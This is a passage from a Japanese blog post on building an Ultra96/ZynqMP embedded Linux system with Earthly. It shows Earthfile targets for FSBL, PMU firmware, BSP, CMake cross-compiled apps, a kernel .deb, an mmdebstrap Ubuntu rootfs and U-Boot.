<span id="cb8-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> $XSA_FILE system.xsa</span>
<span id="cb8-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="va">USER</span><span class="op">=</span><span class="st">&quot;</span><span class="va">$(</span><span class="fu">id</span> <span class="at">-u</span> <span class="at">-n</span><span class="va">)</span><span class="st">&quot;</span> <span class="ex">xsct</span> <span class="at">-sdx</span> <span class="at">-nodisp</span> generate.tcl system.xsa</span>
<span id="cb8-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-8" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT bsp_psu_cortexr5_0</span>
<span id="cb8-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-9" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT device-tree</span>
<span id="cb8-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-10" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT fsbl</span>
<span id="cb8-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-11" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT pmufw</span>
<span id="cb8-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-12" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT system.bit</span>
<span id="cb8-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-14" aria-hidden="true" tabindex="-1"></a>fsbl.elf:</span>
<span id="cb8-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-15" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb8-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-16" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +generate-src/fsbl .</span>
<span id="cb8-17"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-17" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">make</span></span>
<span id="cb8-18"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-18" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT executable.elf /fsbl.elf</span>
<span id="cb8-19"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-20"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-20" aria-hidden="true" tabindex="-1"></a>pmufw.elf:</span>
<span id="cb8-21"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-21" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb8-22"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-22" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +generate-src/pmufw .</span>
<span id="cb8-23"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-23" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">make</span> CFLAGS=<span class="st">&quot;-DENABLE_MOD_ULTRA96 -DULTRA96_VERSION=2 -DPMU_MIO_INPUT_PIN_VAL=1 -DBOARD_SHUTDOWN_PIN_VAL=1 -DBOARD_SHUTDOWN_PIN_STATE_VAL=1&quot;</span></span>
<span id="cb8-24"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-24" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT executable.elf /pmufw.elf</span>
<span id="cb8-25"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-26"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-26" aria-hidden="true" tabindex="-1"></a>bsp-r5-0:</span>
<span id="cb8-27"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-27" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb8-28"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-28" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +generate-src/bsp_psu_cortexr5_0 .</span>
<span id="cb8-29"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-29" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">make</span></span>
<span id="cb8-30"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-30" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT psu_cortexr5_0/include /include</span>
<span id="cb8-31"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb8-31" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT psu_cortexr5_0/lib/*a /lib/</span></code></pre></div>
<h3 id="rpu-と-apu-のアプリケーション">RPU と APU のアプリケーション</h3>
<p>RPU アプリケーションは、素直に Vitis を使ってテンプレートプロジェクトを作りました。xsct-trim と <a href="https://github.com/Xilinx/embeddedsw">Xilinx/embeddedsw</a> の組み合わせでは standalone のテンプレートが出てこなかったためです。でもアプリケーションのビルドは Vitis ではなく自分たちでやりたいので、<a href="https://github.com/Tosainu/earthly-zynqmp-example/blob/27538797d4663eb2637bf9e8570dc23e7465f126/apps/r5_0/lscript.ld"><code>lscript.ld</code></a> など必要なものだけを持ってくるのと、コンパイラに渡しているオプションの確認が済んだら Vitis の出番は終了です。</p>
<p>コードは CMake でビルドできるようにしました。<a href="https://github.com/Tosainu/earthly-zynqmp-example/blob/27538797d4663eb2637bf9e8570dc23e7465f126/apps/r5_0/cmake/Modules/FindLibXil.cmake"><code>FindLibXil.cmake</code></a> を書いたので、<code>libxil.a</code> などを <code>find_package()</code> で探せるようになっています。BSP をビルドしたターゲット <code>bsp-r5-0</code> からライブラリとヘッダファイルをコピーしてきて、それを <code>FindLibXil.cmake</code> が探せるように <code>-DLibXil_ROOT=</code> でパスを渡します。またクロスコンパイラを使ってビルドするために、CMake に toolchain file を渡して指示します。CMake は <code>-S</code>, <code>-B</code>, <code>-DLibXil_ROOT</code> などがカレントディレクトリからの相対パスを受け付けてくれるのに対して、<code>--toolchain</code> は絶対パス、またはビルドディレクトリ・ソースディレクトリからの相対パスを要求してくるのに注意です。</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb9-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-1" aria-hidden="true" tabindex="-1"></a>app-r5-0:</span>
<span id="cb9-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb9-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +bsp-r5-0/ libxil</span>
<span id="cb9-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> apps/r5_0 src</span>
<span id="cb9-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> apps/toolchain/armr5-none-eabi.cmake .</span>
<span id="cb9-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">cmake</span> <span class="dt">\</span></span>
<span id="cb9-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-7" aria-hidden="true" tabindex="-1"></a>        <span class="at">--toolchain</span> <span class="va">$PWD</span>/armr5-none-eabi.cmake <span class="dt">\</span></span>
<span id="cb9-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-8" aria-hidden="true" tabindex="-1"></a>        <span class="at">-S</span> src <span class="dt">\</span></span>
<span id="cb9-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-9" aria-hidden="true" tabindex="-1"></a>        <span class="at">-B</span> build <span class="dt">\</span></span>
<span id="cb9-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-10" aria-hidden="true" tabindex="-1"></a>        <span class="at">-DCMAKE_BUILD_TYPE</span><span class="op">=</span>Release <span class="dt">\</span></span>
<span id="cb9-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-11" aria-hidden="true" tabindex="-1"></a>        <span class="at">-DCMAKE_INSTALL_PREFIX</span><span class="op">=</span>install <span class="dt">\</span></span>
<span id="cb9-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-12" aria-hidden="true" tabindex="-1"></a>        <span class="at">-DLibXil_ROOT</span><span class="op">=</span>libxil</span>
<span id="cb9-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">cmake</span> <span class="at">--build</span> build <span class="at">--</span> install</span>
<span id="cb9-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb9-14" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT install/* /</span></code></pre></div>
<p>APU のアプリケーションも C++ で書いて CMake でビルドします。RPU と違って標準ライブラリと Linux の機能しか使わないので、クロスコンパイルのために toolchain file を渡す以外は特別な設定もなくいつもどおりです。</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb10-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-1" aria-hidden="true" tabindex="-1"></a>app-a53:</span>
<span id="cb10-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb10-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> apps/a53 src</span>
<span id="cb10-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> apps/toolchain/aarch64-linux-gnu.cmake .</span>
<span id="cb10-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">cmake</span> <span class="dt">\</span></span>
<span id="cb10-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-6" aria-hidden="true" tabindex="-1"></a>        <span class="at">--toolchain</span> <span class="va">$PWD</span>/aarch64-linux-gnu.cmake <span class="dt">\</span></span>
<span id="cb10-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-7" aria-hidden="true" tabindex="-1"></a>        <span class="at">-S</span> src <span class="dt">\</span></span>
<span id="cb10-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-8" aria-hidden="true" tabindex="-1"></a>        <span class="at">-B</span> build <span class="dt">\</span></span>
<span id="cb10-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-9" aria-hidden="true" tabindex="-1"></a>        <span class="at">-DCMAKE_BUILD_TYPE</span><span class="op">=</span>Release <span class="dt">\</span></span>
<span id="cb10-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-10" aria-hidden="true" tabindex="-1"></a>        <span class="at">-DCMAKE_INSTALL_PREFIX</span><span class="op">=</span>install/usr</span>
<span id="cb10-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">cmake</span> <span class="at">--build</span> build <span class="at">--</span> install</span>
<span id="cb10-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb10-12" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT install/* /</span></code></pre></div>
<h3 id="linux-カーネルの-.deb-パッケージ">Linux カーネルの .deb パッケージ</h3>
<p>組み込みで Linux を使うなら、やっぱりカーネルのコンフィグはプロジェクト単位で細かく設定したいです。ということでカーネルも一緒にビルドします。今回作る Linux 環境は Ubuntu なので、<code>make bindeb-pkg</code> で <code>.deb</code> パッケージを作ることにしました。</p>
<p>カーネルのコンフィグファイルは実行環境に依存しない <code>defconfig</code> 形式を使うのが望ましいのですが、手抜きをして <code>menuconfig</code> で作ったものをそのままリポジトリに入れています。<code>SAVE ARTIFACT</code> するのは作った <code>.deb</code> パッケージと、あとで <code>.dts</code> をコンパイルするときに使うヘッダファイルです。</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb11-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-1" aria-hidden="true" tabindex="-1"></a>linux:</span>
<span id="cb11-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb11-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="op">--mount=type=tmpfs,target=/tmp</span> <span class="op">\</span></span>
<span id="cb11-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-4" aria-hidden="true" tabindex="-1"></a>        <span class="ex">curl</span> <span class="at">--no-progress-meter</span> <span class="at">-L</span> https://github.com/Xilinx/linux-xlnx/archive/75872fda9ad270b611ee6ae2433492da1e22b688.tar.gz <span class="at">-o</span> /tmp/archive.tar.gz <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb11-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-5" aria-hidden="true" tabindex="-1"></a>        <span class="bu">echo</span> <span class="st">'75e40c693484710cd7fc5cd972adb272414d196121c66a6ee2ca6ef762cb60c9  /tmp/archive.tar.gz'</span> <span class="kw">|</span> <span class="fu">sha256sum</span> <span class="at">-c</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb11-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-6" aria-hidden="true" tabindex="-1"></a>        <span class="fu">tar</span> xf /tmp/archive.tar.gz <span class="at">--strip-components</span><span class="op">=</span>1</span>
<span id="cb11-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> linux/.config .</span>
<span id="cb11-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">ARG</span> nproc=$(nproc)</span>
<span id="cb11-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="va">CROSS_COMPILE</span><span class="op">=</span>aarch64-linux-gnu- <span class="fu">make</span> <span class="at">-j</span><span class="va">$nproc</span> ARCH=arm64 bindeb-pkg</span>
<span id="cb11-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-10" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT include/dt-bindings /include/dt-bindings</span>
<span id="cb11-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb11-11" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT /*.deb</span></code></pre></div>
<h3 id="ubuntu-の-rootfs">Ubuntu の rootfs</h3>
<p>今回のアプリケーションを動かす環境として、Ubuntu は完全にオーバーキルです。それどころかブート時間やデータ量などの面でマイナスです。それでも Ubuntu にしたのは、構築後もその上で変更を加えられて、デスクトップ用途でも使ったことがあるだろう環境が動いてほしいという風潮を感じたためです。Linux From Scratch 的なことをしはじめると <code>crossbuild-essential-arm64</code> と少し相性が悪くなってくるのと、単純に説明が面倒になるからというのもあります。</p>
<p>Ubuntu 環境の構築には <code>mmdebstrap</code> を使ってみました。よく知られた <code>debootstrap</code> と比較して、処理時間が早いことや、より小さな環境を作りやすかったりするのがウリだそうです。</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb12-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-1" aria-hidden="true" tabindex="-1"></a>rootfs-base.tar:</span>
<span id="cb12-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> <span class="op">--platform=linux/arm64</span> ubuntu:jammy@sha256:1bc0bc3815bdcfafefa6b3ef1d8fd159564693d0f8fbb37b8151074651a11ffb</span>
<span id="cb12-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="ex">apt-get</span> update <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb12-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-4" aria-hidden="true" tabindex="-1"></a>        <span class="ex">apt-get</span> install <span class="at">-y</span> <span class="at">--no-install-recommends</span> mmdebstrap <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb12-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-5" aria-hidden="true" tabindex="-1"></a>        <span class="fu">rm</span> <span class="at">-rf</span> /var/lib/apt/lists/<span class="pp">*</span></span>
<span id="cb12-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +linux/*.deb kernels/</span>
<span id="cb12-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="ex">mmdebstrap</span> <span class="dt">\</span></span>
<span id="cb12-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-8" aria-hidden="true" tabindex="-1"></a>        <span class="at">--verbose</span> <span class="dt">\</span></span>
<span id="cb12-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-9" aria-hidden="true" tabindex="-1"></a>        <span class="at">--components</span><span class="op">=</span><span class="st">'main restricted universe multiverse'</span> <span class="dt">\</span></span>
<span id="cb12-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-10" aria-hidden="true" tabindex="-1"></a>        <span class="at">--variant</span><span class="op">=</span><span class="st">'minbase'</span> <span class="dt">\</span></span>
<span id="cb12-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-11" aria-hidden="true" tabindex="-1"></a>        <span class="at">--include</span><span class="op">=</span><span class="st">'apt dbus e2fsprogs init iproute2 iputils-ping kmod libstdc++6 parted sudo systemd-timesyncd udev'</span> <span class="dt">\</span></span>
<span id="cb12-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-12" aria-hidden="true" tabindex="-1"></a>        <span class="at">--customize-hook</span><span class="op">=</span><span class="st">'cp -r kernels &quot;$1/&quot; &amp;&amp; chroot &quot;$1&quot; sh -c &quot;dpkg -i /kernels/*.deb&quot; &amp;&amp; rm -rf &quot;$1/kernels&quot;'</span> <span class="dt">\</span></span>
<span id="cb12-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-13" aria-hidden="true" tabindex="-1"></a>        <span class="at">--customize-hook</span><span class="op">=</span><span class="st">'sed -i &quot;s/^#\s*\(%sudo\)/\1/&quot; &quot;$1/etc/sudoers&quot;'</span> <span class="dt">\</span></span>
<span id="cb12-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-14" aria-hidden="true" tabindex="-1"></a>        <span class="at">--customize-hook</span><span class="op">=</span><span class="st">'chroot &quot;$1&quot; adduser --disabled-password user'</span> <span class="dt">\</span></span>
<span id="cb12-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-15" aria-hidden="true" tabindex="-1"></a>        <span class="at">--customize-hook</span><span class="op">=</span><span class="st">'chroot &quot;$1&quot; adduser user sudo'</span> <span class="dt">\</span></span>
<span id="cb12-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-16" aria-hidden="true" tabindex="-1"></a>        <span class="at">--customize-hook</span><span class="op">=</span><span class="st">'echo &quot;user:user&quot; | chroot &quot;$1&quot; chpasswd'</span> <span class="dt">\</span></span>
<span id="cb12-17"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-17" aria-hidden="true" tabindex="-1"></a>        <span class="at">--customize-hook</span><span class="op">=</span><span class="st">'chroot &quot;$1&quot; passwd --expire user'</span> <span class="dt">\</span></span>
<span id="cb12-18"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-18" aria-hidden="true" tabindex="-1"></a>        <span class="at">--customize-hook</span><span class="op">=</span><span class="st">'chroot &quot;$1&quot; passwd --lock root'</span> <span class="dt">\</span></span>
<span id="cb12-19"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-19" aria-hidden="true" tabindex="-1"></a>        <span class="at">--dpkgopt</span><span class="op">=</span><span class="st">'path-exclude=/usr/share/man/*'</span> <span class="dt">\</span></span>
<span id="cb12-20"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-20" aria-hidden="true" tabindex="-1"></a>        <span class="at">--dpkgopt</span><span class="op">=</span><span class="st">'path-include=/usr/share/man/man[1-9]/*'</span> <span class="dt">\</span></span>
<span id="cb12-21"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-21" aria-hidden="true" tabindex="-1"></a>        <span class="at">--dpkgopt</span><span class="op">=</span><span class="st">'path-exclude=/usr/share/locale/*'</span> <span class="dt">\</span></span>
<span id="cb12-22"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-22" aria-hidden="true" tabindex="-1"></a>        <span class="at">--dpkgopt</span><span class="op">=</span><span class="st">'path-include=/usr/share/locale/locale.alias'</span> <span class="dt">\</span></span>
<span id="cb12-23"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-23" aria-hidden="true" tabindex="-1"></a>        <span class="at">--dpkgopt</span><span class="op">=</span><span class="st">'path-exclude=/usr/share/doc/*'</span> <span class="dt">\</span></span>
<span id="cb12-24"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-24" aria-hidden="true" tabindex="-1"></a>        <span class="at">--dpkgopt</span><span class="op">=</span><span class="st">'path-include=/usr/share/doc/*/copyright'</span> <span class="dt">\</span></span>
<span id="cb12-25"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-25" aria-hidden="true" tabindex="-1"></a>        jammy rootfs-base.tar http://ports.ubuntu.com/ubuntu-ports</span>
<span id="cb12-26"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-26" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Use .tar format since SAVE ARTIFACT and COPY drop permissions for some reason even specifying with the --keep-own option...</span></span>
<span id="cb12-27"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb12-27" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT rootfs-base.tar</span></code></pre></div>
<p>これまでのターゲットと違い、<code>FROM</code> には <code>--platform=linux/arm64</code> を渡して 64 bit ARM の Ubuntu が設定されています。Earthly にビルドさせる前に qemu-user-static と binfnt_misc を設定しておきましょう。<code>mmdebstrap</code> にこれを勝手にやってくれる機能もあるようですが、Earthly の起動するコンテナ内でやってもらおうとするとたぶん <code>--privileged</code> が必要なので使っていません。<code>mmdebstrap</code> 出力形式はディレクトリではなく <code>.tar</code> にしています。<code>SAVE ARTIFACT</code> や <code>COPY</code> にディレクトリを渡したとき、<code>-–keep-own</code> を渡したとしてもファイルのオーナーが root に変わってしまう現象があったためです。ちなみに無圧縮な <code>.tar</code> なのは時間短縮のためです。このターゲット内での処理は QEMU を介して動いてしまうのを忘れてはいけません<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a>。</p>
<p><code>mmdebstrap</code> は、<code>--customize-hook=</code> などのコマンドラインオプションで構築中の環境に対して任意のコマンドを実行できます。しかし、このターゲット内でのカスタマイズは最低限のもの、具体的には <code>chroot</code> を介さないと難しいものだけにとどめています。これは、なにか変更をしようとしたときに毎回 <code>mmdebstrap</code> が走ってしまうのを防ぐためです。いくら <code>mmdebstrap</code> が速さをアピールしているといえ、ファイル追加といった簡単なタスクに対しても毎回 <code>mmdebstrap</code> が走ってしまうのはかなり不便なので。</p>
<p>作った Ubuntu の <code>.tar</code> にファイルの追加をしているのがこのターゲットです。追加するのは APU のアプリケーションやその他設定ファイル類です。ファイルを追加するだけなら <code>tar</code> を展開しなくてもできます。</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb13-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb13-1" aria-hidden="true" tabindex="-1"></a>rootfs.tar:</span>
<span id="cb13-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb13-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb13-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb13-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +rootfs-base.tar/rootfs-base.tar rootfs.tar</span>
<span id="cb13-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb13-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> linux/rootfs rootfs</span>
<span id="cb13-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb13-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +app-a53/ rootfs</span>
<span id="cb13-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb13-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">tar</span> <span class="at">--append</span> <span class="at">-f</span> rootfs.tar <span class="at">--xattrs</span> <span class="at">--xattrs-include</span><span class="op">=</span><span class="st">'*'</span> <span class="at">-C</span> rootfs .</span>
<span id="cb13-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb13-7" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT rootfs.tar</span></code></pre></div>
<h3 id="u-boot">U-Boot</h3>
<p>U-Boot のビルドは、<code>ARCH</code> に渡す値が <code>aarch64</code> に変わるくらいで Linux とほぼ同じです。ビルドで一緒に作られるツール <code>dtc</code> と <code>mkimage</code> がこの後の作業で必要なので、これらも忘れず <code>SAVE ARTIFACT</code> しておきます。</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb14-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-1" aria-hidden="true" tabindex="-1"></a>u-boot:</span>
<span id="cb14-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb14-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="op">--mount=type=tmpfs,target=/tmp</span> <span class="op">\</span></span>
<span id="cb14-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-4" aria-hidden="true" tabindex="-1"></a>        <span class="ex">curl</span> <span class="at">--no-progress-meter</span> <span class="at">-L</span> https://github.com/Xilinx/u-boot-xlnx/archive/refs/tags/xilinx-v2022.1.tar.gz <span class="at">-o</span> /tmp/archive.tar.gz <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-5" aria-hidden="true" tabindex="-1"></a>        <span class="bu">echo</span> <span class="st">'a02adc8d80f736050772367ea6f868214faaf47b6b3539781d6972dab26b227c  /tmp/archive.tar.gz'</span> <span class="kw">|</span> <span class="fu">sha256sum</span> <span class="at">-c</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb14-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-6" aria-hidden="true" tabindex="-1"></a>        <span class="fu">tar</span> xf /tmp/archive.tar.gz <span class="at">--strip-components</span><span class="op">=</span>1</span>
